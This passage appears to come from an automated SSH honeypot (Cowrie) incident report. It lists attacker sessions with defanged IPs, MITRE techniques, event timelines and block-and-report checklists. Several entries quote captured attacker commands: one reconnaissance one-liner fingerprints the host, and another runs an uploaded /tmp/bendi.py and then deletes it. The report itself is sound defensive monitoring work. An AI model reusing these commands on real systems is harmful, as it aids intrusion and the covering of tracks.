| `2026-07-22 20:14:23` | `cowrie.session.params` |
| `2026-07-22 20:14:23` | `cowrie.command.input` |
| `2026-07-22 20:14:23` | `cowrie.command.input` |
| `2026-07-22 20:14:23` | `cowrie.command.input` |
| `2026-07-22 20:14:23` | `cowrie.command.input` |
| `2026-07-22 20:14:23` | `cowrie.command.input` |
| `2026-07-22 20:14:23` | `cowrie.command.success` |
| `2026-07-22 20:14:23` | `cowrie.command.input` |
| `2026-07-22 20:14:23` | `cowrie.command.input` |
| `2026-07-22 20:14:23` | `cowrie.command.input` |
| `2026-07-22 20:14:23` | `cowrie.command.input` |
| `2026-07-22 20:14:23` | `cowrie.log.closed` |
| `2026-07-22 20:14:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]49` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-136789d7a3f2

| Field | Detail |
|---|---|
| **Source IP** | `158.178.141[.]210` |
| **First Seen** | 2026-07-22 20:14 |
| **Last Seen** | 2026-07-22 20:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 20:14:22` | `cowrie.session.connect` |
| `2026-07-22 20:14:22` | `cowrie.client.version` |
| `2026-07-22 20:14:22` | `cowrie.client.kex` |
| `2026-07-22 20:14:23` | `cowrie.login.success` |
| `2026-07-22 20:14:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `158.178.141[.]210` to AbuseIPDB if not already reported
- [ ] Block `158.178.141[.]210` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-354b560b4614

| Field | Detail |
|---|---|
| **Source IP** | `158.178.141[.]210` |
| **First Seen** | 2026-07-22 20:14 |
| **Last Seen** | 2026-07-22 20:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 20:14:22` | `cowrie.session.connect` |
| `2026-07-22 20:14:22` | `cowrie.client.version` |
| `2026-07-22 20:14:23` | `cowrie.client.kex` |
| `2026-07-22 20:14:23` | `cowrie.login.success` |
| `2026-07-22 20:14:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `158.178.141[.]210` to AbuseIPDB if not already reported
- [ ] Block `158.178.141[.]210` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a085be9e4c9a

| Field | Detail |
|---|---|
| **Source IP** | `158.178.141[.]210` |
| **First Seen** | 2026-07-22 20:14 |
| **Last Seen** | 2026-07-22 20:16 |
| **Session Duration** | 130s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `command -v python3 >/dev/null 2>&1 || (apt-get update -y && apt-get install -y python3) || yum install -y python3, apt-get update -y, apt-get install -y python3, python3 /tmp/bendi.py, rm /tmp/bendi.py` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 20:14:43` | `cowrie.session.connect` |
| `2026-07-22 20:14:43` | `cowrie.client.version` |
| `2026-07-22 20:14:43` | `cowrie.client.kex` |
| `2026-07-22 20:14:44` | `cowrie.login.success` |
| `2026-07-22 20:14:46` | `cowrie.session.file_upload` |
| `2026-07-22 20:14:47` | `cowrie.session.params` |
| `2026-07-22 20:14:47` | `cowrie.command.input` |
| `2026-07-22 20:14:47` | `cowrie.command.input` |
| `2026-07-22 20:14:47` | `cowrie.command.input` |
| `2026-07-22 20:14:47` | `cowrie.command.failed` |
| `2026-07-22 20:14:48` | `cowrie.log.closed` |
| `2026-07-22 20:14:49` | `cowrie.session.params` |
| `2026-07-22 20:14:49` | `cowrie.command.input` |
| `2026-07-22 20:14:49` | `cowrie.log.closed` |
| `2026-07-22 20:14:50` | `cowrie.session.params` |
| `2026-07-22 20:14:50` | `cowrie.command.input` |
| `2026-07-22 20:14:50` | `cowrie.log.closed` |
| `2026-07-22 20:14:51` | `cowrie.session.params` |
| `2026-07-22 20:14:51` | `cowrie.command.input` |
| `2026-07-22 20:14:51` | `cowrie.command.failed` |
| `2026-07-22 20:14:51` | `cowrie.command.failed` |
| `2026-07-22 20:15:52` | `cowrie.session.params` |
| `2026-07-22 20:15:52` | `cowrie.command.input` |
| `2026-07-22 20:16:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `158.178.141[.]210` to AbuseIPDB if not already reported
- [ ] Block `158.178.141[.]210` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-656ca7f4ed44

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]49` |
| **First Seen** | 2026-07-22 20:15 |
| **Last Seen** | 2026-07-22 20:16 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 20:15:59` | `cowrie.session.connect` |
| `2026-07-22 20:15:59` | `cowrie.client.version` |
| `2026-07-22 20:15:59` | `cowrie.client.kex` |
| `2026-07-22 20:16:00` | `cowrie.login.success` |
| `2026-07-22 20:16:02` | `cowrie.session.params` |
| `2026-07-22 20:16:02` | `cowrie.command.input` |
| `2026-07-22 20:16:02` | `cowrie.command.input` |
| `2026-07-22 20:16:02` | `cowrie.command.input` |
| `2026-07-22 20:16:02` | `cowrie.command.input` |
| `2026-07-22 20:16:02` | `cowrie.command.input` |
| `2026-07-22 20:16:02` | `cowrie.command.success` |
| `2026-07-22 20:16:02` | `cowrie.command.input` |
| `2026-07-22 20:16:02` | `cowrie.command.input` |
| `2026-07-22 20:16:02` | `cowrie.command.input` |
| `2026-07-22 20:16:02` | `cowrie.command.input` |
| `2026-07-22 20:16:03` | `cowrie.log.closed` |
| `2026-07-22 20:16:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]49` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-617086c7e695

| Field | Detail |
|---|---|
| **Source IP** | `111.70.32[.]53` |
| **First Seen** | 2026-07-22 20:16 |
| **Last Seen** | 2026-07-22 20:16 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 20:16:13` | `cowrie.session.connect` |
| `2026-07-22 20:16:13` | `cowrie.client.version` |
| `2026-07-22 20:16:13` | `cowrie.client.kex` |
| `2026-07-22 20:16:16` | `cowrie.login.success` |
| `2026-07-22 20:16:16` | `cowrie.direct-tcpip.request` |
| `2026-07-22 20:16:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.70.32[.]53` to AbuseIPDB if not already reported
- [ ] Block `111.70.32[.]53` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-214ce69f7f40

| Field | Detail |
|---|---|
| **Source IP** | `117.211.15[.]106` |
| **First Seen** | 2026-07-22 20:16 |
| **Last Seen** | 2026-07-22 20:16 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 20:16:23` | `cowrie.session.connect` |
| `2026-07-22 20:16:24` | `cowrie.client.version` |
| `2026-07-22 20:16:24` | `cowrie.client.kex` |
| `2026-07-22 20:16:26` | `cowrie.login.success` |
| `2026-07-22 20:16:27` | `cowrie.direct-tcpip.request` |
| `2026-07-22 20:16:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.211.15[.]106` to AbuseIPDB if not already reported
- [ ] Block `117.211.15[.]106` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-62cfe2c2cdda

| Field | Detail |
|---|---|
| **Source IP** | `220.122.115[.]9` |
| **First Seen** | 2026-07-22 20:16 |
| **Last Seen** | 2026-07-22 20:16 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 20:16:25` | `cowrie.session.connect` |
| `2026-07-22 20:16:26` | `cowrie.client.version` |
| `2026-07-22 20:16:26` | `cowrie.client.kex` |
| `2026-07-22 20:16:28` | `cowrie.login.success` |
| `2026-07-22 20:16:28` | `cowrie.direct-tcpip.request` |
| `2026-07-22 20:16:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.122.115[.]9` to AbuseIPDB if not already reported
- [ ] Block `220.122.115[.]9` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-290f5a3efa74

| Field | Detail |
|---|---|
| **Source IP** | `49.124.149[.]53` |
| **First Seen** | 2026-07-22 20:16 |
| **Last Seen** | 2026-07-22 20:16 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 20:16:41` | `cowrie.session.connect` |
| `2026-07-22 20:16:42` | `cowrie.client.version` |
| `2026-07-22 20:16:42` | `cowrie.client.kex` |
| `2026-07-22 20:16:44` | `cowrie.login.success` |
| `2026-07-22 20:16:45` | `cowrie.direct-tcpip.request` |
| `2026-07-22 20:16:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.124.149[.]53` to AbuseIPDB if not already reported
- [ ] Block `49.124.149[.]53` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-29afe6729159

| Field | Detail |
|---|---|
| **Source IP** | `158.178.141[.]210` |
| **First Seen** | 2026-07-22 20:17 |
| **Last Seen** | 2026-07-22 20:19 |
| **Session Duration** | 130s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `command -v python3 >/dev/null 2>&1 || (apt-get update -y && apt-get install -y python3) || yum install -y python3, apt-get update -y, apt-get install -y python3, python3 /tmp/bendi.py, rm /tmp/bendi.py` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 20:17:09` | `cowrie.session.connect` |
| `2026-07-22 20:17:09` | `cowrie.client.version` |
| `2026-07-22 20:17:09` | `cowrie.client.kex` |
| `2026-07-22 20:17:10` | `cowrie.login.success` |
| `2026-07-22 20:17:12` | `cowrie.session.file_upload` |
| `2026-07-22 20:17:13` | `cowrie.session.params` |
| `2026-07-22 20:17:13` | `cowrie.command.input` |
| `2026-07-22 20:17:13` | `cowrie.command.input` |
| `2026-07-22 20:17:13` | `cowrie.command.input` |
| `2026-07-22 20:17:13` | `cowrie.command.failed` |
| `2026-07-22 20:17:13` | `cowrie.log.closed` |
| `2026-07-22 20:17:14` | `cowrie.session.params` |
| `2026-07-22 20:17:14` | `cowrie.command.input` |
| `2026-07-22 20:17:15` | `cowrie.log.closed` |
| `2026-07-22 20:17:15` | `cowrie.session.params` |
| `2026-07-22 20:17:15` | `cowrie.command.input` |
| `2026-07-22 20:17:16` | `cowrie.log.closed` |
| `2026-07-22 20:17:17` | `cowrie.session.params` |
| `2026-07-22 20:17:17` | `cowrie.command.input` |
| `2026-07-22 20:17:17` | `cowrie.command.failed` |
| `2026-07-22 20:17:17` | `cowrie.command.failed` |
| `2026-07-22 20:18:18` | `cowrie.session.params` |
| `2026-07-22 20:18:18` | `cowrie.command.input` |
| `2026-07-22 20:19:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `158.178.141[.]210` to AbuseIPDB if not already reported
- [ ] Block `158.178.141[.]210` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0348f66069a9

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]49` |
| **First Seen** | 2026-07-22 20:17 |
| **Last Seen** | 2026-07-22 20:17 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 20:17:40` | `cowrie.session.connect` |
| `2026-07-22 20:17:40` | `cowrie.client.version` |
| `2026-07-22 20:17:40` | `cowrie.client.kex` |
| `2026-07-22 20:17:41` | `cowrie.login.success` |
| `2026-07-22 20:17:42` | `cowrie.session.params` |
| `2026-07-22 20:17:42` | `cowrie.command.input` |
| `2026-07-22 20:17:42` | `cowrie.command.input` |
| `2026-07-22 20:17:42` | `cowrie.command.input` |
| `2026-07-22 20:17:42` | `cowrie.command.input` |
| `2026-07-22 20:17:42` | `cowrie.command.input` |
| `2026-07-22 20:17:42` | `cowrie.command.success` |
| `2026-07-22 20:17:42` | `cowrie.command.input` |
| `2026-07-22 20:17:42` | `cowrie.command.input` |
| `2026-07-22 20:17:42` | `cowrie.command.input` |
| `2026-07-22 20:17:42` | `cowrie.command.input` |
| `2026-07-22 20:17:43` | `cowrie.log.closed` |
| `2026-07-22 20:17:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]49` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0057fac77b75

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]49` |
| **First Seen** | 2026-07-22 20:19 |
| **Last Seen** | 2026-07-22 20:19 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 20:19:21` | `cowrie.session.connect` |
| `2026-07-22 20:19:21` | `cowrie.client.version` |
| `2026-07-22 20:19:21` | `cowrie.client.kex` |
| `2026-07-22 20:19:22` | `cowrie.login.success` |
| `2026-07-22 20:19:24` | `cowrie.session.params` |
| `2026-07-22 20:19:24` | `cowrie.command.input` |
| `2026-07-22 20:19:24` | `cowrie.command.input` |
| `2026-07-22 20:19:24` | `cowrie.command.input` |
| `2026-07-22 20:19:24` | `cowrie.command.input` |
| `2026-07-22 20:19:24` | `cowrie.command.input` |
| `2026-07-22 20:19:24` | `cowrie.command.success` |
| `2026-07-22 20:19:24` | `cowrie.command.input` |
| `2026-07-22 20:19:24` | `cowrie.command.input` |
| `2026-07-22 20:19:24` | `cowrie.command.input` |
| `2026-07-22 20:19:24` | `cowrie.command.input` |
| `2026-07-22 20:19:24` | `cowrie.log.closed` |
| `2026-07-22 20:19:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]49` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-765f07c7c55c

| Field | Detail |
|---|---|
| **Source IP** | `177.174.0[.]3` |
| **First Seen** | 2026-07-22 20:19 |
| **Last Seen** | 2026-07-22 20:19 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 20:19:50` | `cowrie.session.connect` |
| `2026-07-22 20:19:50` | `cowrie.client.version` |
| `2026-07-22 20:19:50` | `cowrie.client.kex` |
| `2026-07-22 20:19:52` | `cowrie.login.success` |
| `2026-07-22 20:19:52` | `cowrie.direct-tcpip.request` |
| `2026-07-22 20:19:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.174.0[.]3` to AbuseIPDB if not already reported
- [ ] Block `177.174.0[.]3` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f1b6121d1d8b

| Field | Detail |
|---|---|
| **Source IP** | `173.181.131[.]247` |
| **First Seen** | 2026-07-22 20:20 |
| **Last Seen** | 2026-07-22 20:20 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 20:20:02` | `cowrie.session.connect` |
| `2026-07-22 20:20:02` | `cowrie.client.version` |
| `2026-07-22 20:20:03` | `cowrie.client.kex` |
| `2026-07-22 20:20:04` | `cowrie.login.success` |
| `2026-07-22 20:20:05` | `cowrie.direct-tcpip.request` |
| `2026-07-22 20:20:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `173.181.131[.]247` to AbuseIPDB if not already reported
- [ ] Block `173.181.131[.]247` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5e66649cdde7

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]49` |
| **First Seen** | 2026-07-22 20:21 |
| **Last Seen** | 2026-07-22 20:21 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 20:21:02` | `cowrie.session.connect` |
| `2026-07-22 20:21:02` | `cowrie.client.version` |
| `2026-07-22 20:21:02` | `cowrie.client.kex` |
| `2026-07-22 20:21:04` | `cowrie.login.success` |
| `2026-07-22 20:21:05` | `cowrie.session.params` |
| `2026-07-22 20:21:05` | `cowrie.command.input` |
| `2026-07-22 20:21:05` | `cowrie.command.input` |
| `2026-07-22 20:21:05` | `cowrie.command.input` |
| `2026-07-22 20:21:05` | `cowrie.command.input` |
| `2026-07-22 20:21:05` | `cowrie.command.input` |
| `2026-07-22 20:21:05` | `cowrie.command.success` |
| `2026-07-22 20:21:05` | `cowrie.command.input` |
| `2026-07-22 20:21:05` | `cowrie.command.input` |
| `2026-07-22 20:21:05` | `cowrie.command.input` |
| `2026-07-22 20:21:05` | `cowrie.command.input` |
| `2026-07-22 20:21:05` | `cowrie.log.closed` |
| `2026-07-22 20:21:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]49` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a6fdb717c20c

| Field | Detail |
|---|---|
| **Source IP** | `62.201.253[.]23` |
| **First Seen** | 2026-07-22 20:22 |
| **Last Seen** | 2026-07-22 20:22 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 20:22:34` | `cowrie.session.connect` |
| `2026-07-22 20:22:34` | `cowrie.client.version` |
| `2026-07-22 20:22:34` | `cowrie.client.kex` |
| `2026-07-22 20:22:35` | `cowrie.login.success` |
| `2026-07-22 20:22:35` | `cowrie.direct-tcpip.request` |
| `2026-07-22 20:22:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `62.201.253[.]23` to AbuseIPDB if not already reported
- [ ] Block `62.201.253[.]23` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6e36d672d662

| Field | Detail |
|---|---|
| **Source IP** | `111.70.23[.]253` |
| **First Seen** | 2026-07-22 20:24 |
| **Last Seen** | 2026-07-22 20:25 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 20:24:56` | `cowrie.session.connect` |
| `2026-07-22 20:24:57` | `cowrie.client.version` |
| `2026-07-22 20:24:57` | `cowrie.client.kex` |
| `2026-07-22 20:24:59` | `cowrie.login.success` |
| `2026-07-22 20:25:00` | `cowrie.direct-tcpip.request` |
| `2026-07-22 20:25:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.70.23[.]253` to AbuseIPDB if not already reported
- [ ] Block `111.70.23[.]253` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-35d2dc5eaf04

| Field | Detail |
|---|---|
| **Source IP** | `60.212.0[.]13` |
| **First Seen** | 2026-07-22 20:25 |
| **Last Seen** | 2026-07-22 20:25 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 20:25:11` | `cowrie.session.connect` |
| `2026-07-22 20:25:12` | `cowrie.client.version` |
| `2026-07-22 20:25:12` | `cowrie.client.kex` |
| `2026-07-22 20:25:13` | `cowrie.login.success` |
| `2026-07-22 20:25:14` | `cowrie.direct-tcpip.request` |
| `2026-07-22 20:25:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `60.212.0[.]13` to AbuseIPDB if not already reported
- [ ] Block `60.212.0[.]13` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dcbbb044d060

| Field | Detail |
|---|---|
| **Source IP** | `106.89.50[.]210` |
| **First Seen** | 2026-07-22 20:25 |
| **Last Seen** | 2026-07-22 20:25 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 20:25:43` | `cowrie.session.connect` |
| `2026-07-22 20:25:44` | `cowrie.client.version` |
| `2026-07-22 20:25:44` | `cowrie.client.kex` |
| `2026-07-22 20:25:46` | `cowrie.login.success` |
| `2026-07-22 20:25:46` | `cowrie.direct-tcpip.request` |
| `2026-07-22 20:25:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.89.50[.]210` to AbuseIPDB if not already reported
- [ ] Block `106.89.50[.]210` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-45e826462032

| Field | Detail |
|---|---|
| **Source IP** | `189.52.52[.]162` |
| **First Seen** | 2026-07-22 20:28 |
| **Last Seen** | 2026-07-22 20:28 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 20:28:16` | `cowrie.session.connect` |
| `2026-07-22 20:28:17` | `cowrie.client.version` |
| `2026-07-22 20:28:17` | `cowrie.client.kex` |
| `2026-07-22 20:28:19` | `cowrie.login.success` |
| `2026-07-22 20:28:19` | `cowrie.direct-tcpip.request` |
| `2026-07-22 20:28:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.52.52[.]162` to AbuseIPDB if not already reported
- [ ] Block `189.52.52[.]162` at perimeter firewall / security group
